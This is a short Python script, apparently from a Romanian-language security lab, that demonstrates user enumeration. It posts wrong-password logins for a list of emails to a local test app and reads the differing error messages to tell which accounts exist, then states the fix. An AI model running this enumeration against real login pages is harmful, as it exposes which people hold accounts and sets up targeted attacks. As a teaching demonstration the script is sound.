"""
ATAC 4.4 — User Enumeration
============================
Demonstreaza ca aplicatia expune informatii despre existenta
utilizatorilor prin mesaje de eroare diferentiate.

Vulnerabilitate: mesaj diferit pentru "user inexistent" vs "parola gresita"
Impact: un atacator poate afla ce adrese de email au cont in aplicatie,
        folosind aceste informatii pentru atacuri tintite ulterioare.
"""

import requests

BASE_URL = "http://127.0.0.1:5000"
PAROLA_FALSA = "parola_falsa_intentionat_123"

# Emailuri de testat — unele exista, altele nu
EMAILURI = [
    "alice@authx.com",         # EXISTA
    "bob@authx.com",           # EXISTA
    "admin@authx.com",         # EXISTA
    "victim@authx.com",        # EXISTA
    "inexistent@test.com",     # NU exista
    "hacker@fake.com",         # NU exista
]

print("=" * 60)
print("  ATAC 4.4 — User Enumeration prin mesaje de eroare")
print("=" * 60)
print(f"  Target: {BASE_URL}/login")
print(f"  Metoda: parola intentionat gresita, analiza mesaj")
print("=" * 60)
print()

existenti = []

for email in EMAILURI:
    response = requests.post(
        f"{BASE_URL}/login",
        data={"email": email, "password": PAROLA_FALSA},
        allow_redirects=True
    )

    text = response.text

    if "Utilizatorul nu exista" in text:
        status = "NU ARE CONT"
    elif "Parola gresita" in text:
        status = "ARE CONT ✗ — utilizator enumerat!"
        existenti.append(email)
    else:
        status = "raspuns necunoscut"

    print(f"  {email:<35} → {status}")

print()
print("=" * 60)
print(f"  Utilizatori enumerati: {len(existenti)}")
for e in existenti:
    print(f"    - {e}")
print("=" * 60)
print()
print("[!] Concluzie: mesajele diferite permit enumerarea conturilor.")
print("[!] Un atacator stie acum ce emailuri sunt inregistrate.")
print("[!] Fix: mesaj unic 'Credentiale invalide.' pentru ambele cazuri.")
